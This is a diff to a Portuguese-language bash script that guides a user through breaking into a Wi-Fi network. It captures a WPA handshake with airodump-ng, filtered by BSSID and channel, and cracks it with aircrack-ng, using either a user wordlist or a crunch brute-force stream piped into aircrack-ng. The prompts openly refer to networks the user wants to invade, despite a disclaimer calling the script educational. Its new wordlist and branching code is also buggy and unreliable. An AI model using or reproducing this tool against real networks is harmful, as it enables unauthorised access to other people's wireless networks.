@@ -3,6 +3,8 @@
 #nao me responsabilizo se for usado para o mal
 #isso é uma ferramenta educativa, etica, e explicativa.
 #fassa bom uso.
+
+
 echo Nao se esqueca de usar o iniciar o setup primeiro
 
 sleep 2
@@ -45,7 +47,7 @@ clear
 echo "caso não saiba qual sua interface de rede use o comando 'iwconfig' e identifique sua interface "
 
 
-echo -e "\e[38;5;82mvamos la com 'airmon-ng'começar a bsucar redes proximas por favor informe sua interface de rede:" 
+echo -e "\e[38;5;82mvamos la com 'airmon-ng'e defina sua interface de rede:" 
 read interface
 
 sleep 10
@@ -86,19 +88,21 @@ echo "MINIMO RECOMENDADO:20 beacons"
 echo "QUANDO ACHAR QUE JA TEM 'BEACONS' O SUFICIENTE NA REDE QUE DESEJA INVADIR PRESSIONE (ctrl + c)"
 echo "OBS: olhe na parte superior esquerda da rede que voce deseja invadir se aparecer 'handshake' ou algo voce ja conseguiu obter o handshake dessa rede"
 echo "CASO QUEIRA USAR 'aireplay-ng' abra a script  'aireplay-ng.sh' e iniciara um guia para usar o aireplay-ng (LEMBRE-SE USE O AIREPLAY APENAS QUANDOO TIVER 20 BEACONS NO MINIMO NO AIRODUMP-NG E NA REDE QUE DESEJA INVADIR)"
-echo "Leia tudo e aguarde 30 segundos para continuar..."
+echo "Leia tudo e aguarde 40 segundos para continuar..."
 
- sleep 30
+ sleep 40
  
- echo "agora vamos filtrar a rede que voce deseja invadir lembresse do 'BSSID' dela."
  echo "agora o BSSID da rede que deseja hackar. como eu disse anteorimente vai servir para filtrar apenas essa rede monitorar apenas ela assim tendo mais precisao e so o necessario"
  
  echo -e "\e[38;5;82mqual o BSSID?:" 
  read bssid 
+
+  echo -e "\e[38;5;82mqual o channel?:" 
+ read channel
  
  sleep 10
  
-airodump-ng $monitor --bssid $bssid
+airodump-ng $monitor --bssid $bssid -c $channel -w psk.cap
 
 
 
@@ -109,15 +113,41 @@ echo "esse provalvelmente é o 'handshake' caso há varios 'handshakes' nao se p
 echo "vamos continuar com 'aircrack-ng'. ai esta a cereja do bolo hehe. ele é quem vai descriptografar a senha com as informaçoes que voce obteve com 'airodump-ng'."
 
 echo "lembre-se de onde esta salvo o 'handshake' e lembresse do 'BSSID' sabera qual é confio em voce"
-echo "ee tambem voce necessitara de uma wordlist. pode baixar uma na internet ou criar personalizadas com elpscryk.py ou crunch ou CUPP" 
+echo "ee tambem voce necessitara de uma wordlist ou caso desejo nossa wordlist infinita não. pode baixar uma na internet ou criar personalizadas com elpscryk.py ou crunch ou CUPP" 
 
 sleep 10
 
-echo  -e "\e[38;5;82mvamos la, onde esta o handshake?:"
-read handshake
 
 
-echo -e "\e[38;5;82monde esta a sua wordlist?:"
+function wordlist0()
+{
+    echo -e "\e[38;5;82monde esta a sua wordlist?:"
+read wordlist1
+
+aircrack-ng -w $wordlist -b $bssid  psk*.cap
+
+}
+
+function wordlist4()
+{
+    crunch 8 16 --stdout | aircrack-ng -w - -b $bssid  psk*.cap
+}
+
+echo -e "\e[38;5;82mquer usar nossa wordlist infinita?s ou n?(se não tera que definir o path da sua propria wordlist limitada.):"
+echo 'S/N:'
 read wordlist
 
-aircrack-ng -w  $wordlist -b $bssid -e $handshake
+if $wordlist -eq s 
+then
+    wordlist0
+    else
+        wordlist4
+fi
+
+if $wordlist -eq S
+then
+    wordlist0
+    else
+        wordlist4
+fi
+
